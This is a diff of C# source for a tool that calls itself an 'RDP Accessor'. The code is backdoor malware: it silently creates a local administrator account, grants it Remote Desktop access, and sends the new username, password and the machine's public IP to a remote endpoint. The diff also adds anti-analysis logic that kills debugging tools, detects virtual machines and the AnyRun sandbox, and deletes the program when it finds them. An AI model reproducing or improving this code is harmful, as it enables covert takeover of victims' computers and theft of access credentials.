@@ -29,63 +29,58 @@ namespace localhost
 
 
         }
-
-
         private static void createAdminUser()
         {
             try
             {
-                Program.AppendToSummary("Created Admin User");
-                Program.RunPS($"net user {Program.newUserName} {Program.newUserPass} /add");
-                Program.RunPS($"net localgroup administrators {Program.newUserName} /add");
+                AppendToSummary("Created Admin User");
+                RunPS($"net user {newUserName} {newUserPass} /add");
+                RunPS($"net localgroup administrators {newUserName} /add");
             }
             catch (Exception)
             {
-                // Ошибки не выводятся, вызывается selfRemove
                 throw;
             }
         }
-
         private static void allowRemoteAccess()
         {
             try
             {
-                Program.AppendToSummary("Allowed Remote Access");
-                Program.RunPS($"net localgroup \"Remote Desktop Users\" {Program.newUserName} /add");
+                AppendToSummary("Allowed Remote Access");
+                RunPS($"net localgroup \"Remote Desktop Users\" {newUserName} /add");
             }
             catch (Exception)
             {
-                // Ошибки не выводятся, вызывается selfRemove
                 throw;
             }
         }
 
         private static void AppendToSummary(string text)
         {
-            Program.summaryMessage = Program.summaryMessage + text + Environment.NewLine;
+            summaryMessage = summaryMessage + text + Environment.NewLine;
         }
 
         private static void SendMessage(string text)
         {
             try
             {
-                string ram = Program.GetRAM();
+                string ram = GetRAM();
                 string value = string.Concat(new string[]
                 {
                     string.Concat(new string[]
                     {
-                        "====[New Admin User Information]====",
+                        "===[ ]===[ RDP ACCESSOR V2 LOG ]===[ ]===",
                         Environment.NewLine,
-                        Program.summaryMessage,
+                        summaryMessage,
                         "[+]  Username => ",
-                        Program.newUserName,
+                        newUserName,
                         "\n[+]  Password => ",
-                        Program.newUserPass,
+                        newUserPass,
                         "\n[+]  IP => ",
-                        Program.Get("https://www.ifconfig.me/"),
-                        "\n[+]  RAM => ",
-                        ram,
-                        "\n===[ ]===[ RDP ACCESSOR LOG ]===[ ]==="
+                        Get("https://api.ipify.org/"),
+                        "\n[+]  RAM => ", ram,
+                        "\n[+]  Result => ",text,
+                        "\n===[ ]===[ NEW ADMIN-USER LOG ]===[ ]==="
                     })
                 });
                 using (WebClient webClient = new WebClient())
@@ -104,12 +99,25 @@ namespace localhost
             }
             catch (Exception)
             {
-                // Ошибки не выводятся, вызывается selfRemove
                 throw;
             }
         }
 
-        public static bool CheckProcesses()
+        private static void CheckAnalysis()
+        {
+            if (AntiVM_Checker())
+            {
+                autoSeflDel();
+            }
+
+            if (AnyRunDtc())
+            {
+                autoSeflDel();
+            }
+        }
+
+        // CHECK FORBIDDEN PROCESSES AND CHECKING VIRTUAL MACHINES OR ANYRUN | START
+        public static bool CheckProcesses() // Check Forbidden processes to kill
         {
             string[] forbiddenProcesses = {
                 "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
@@ -136,7 +144,7 @@ namespace localhost
                             process.Kill();
                             process.Dispose();
                         }
-                        catch{}
+                        catch { }
 
 
                         return true;
@@ -145,9 +153,9 @@ namespace localhost
             }
 
             return false;
-        }
+        } // End function
 
-        private static bool AnyRunDtc()
+        private static bool AnyRunDtc() // Check AnyRun
         {
             string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };
 
@@ -159,23 +167,21 @@ namespace localhost
                 }
             }
 
-            // Проверка на имя пользователя и имя машины
             if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
             {
-                autoSeflDel();
+                return true;
             }
 
             return false;
-        }
+        } // End function
 
-
-        private static bool AntiVM_Checker()
+        private static bool AntiVM_Checker() // Check Virtual Machine
         {
             string[] vmProcesses = {
         "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
         "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
-        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
-        "VBoxTray",
+        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxsService",
+        "VBoxsTray",
     };
 
             var processes = Process.GetProcesses();
@@ -186,21 +192,15 @@ namespace localhost
                 {
                     if (process.ProcessName.ToLower() == processName.ToLower())
                     {
-                        autoSeflDel();
+                        return true;
                     }
                 }
             }
 
             return false;
-        }
+        } // End Function
 
-
-
-        private static void CheckAnalysis()
-        {
-            AntiVM_Checker();
-            AnyRunDtc();
-        }
+    // END CHECKING
         
 
         private static void RunPS(string args)
@@ -240,27 +240,18 @@ namespace localhost
             }
             catch (Exception)
             {
-                // Ошибки не выводятся, вызывается selfRemove
                 throw;
             }
         }
 
         private static string Get(string uri)
         {
-            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(uri);
-            httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
-            string result;
-            using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
+            using (WebClient client = new WebClient())
             {
-                using (Stream responseStream = httpWebResponse.GetResponseStream())
-                {
-                    using (StreamReader streamReader = new StreamReader(responseStream))
-                    {
-                        result = streamReader.ReadToEnd();
-                    }
-                }
+                string result = client.DownloadString(uri);
+                return result;
             }
-            return result;
+            
         }
 
 
@@ -268,7 +259,9 @@ namespace localhost
         {
             var fileName = Process.GetCurrentProcess().MainModule.FileName;
             selfRemove(fileName, 1);
+            Environment.Exit(0);
         }
+
 
         private static void selfRemove(string fileName, int delaySecond = 2)
         {
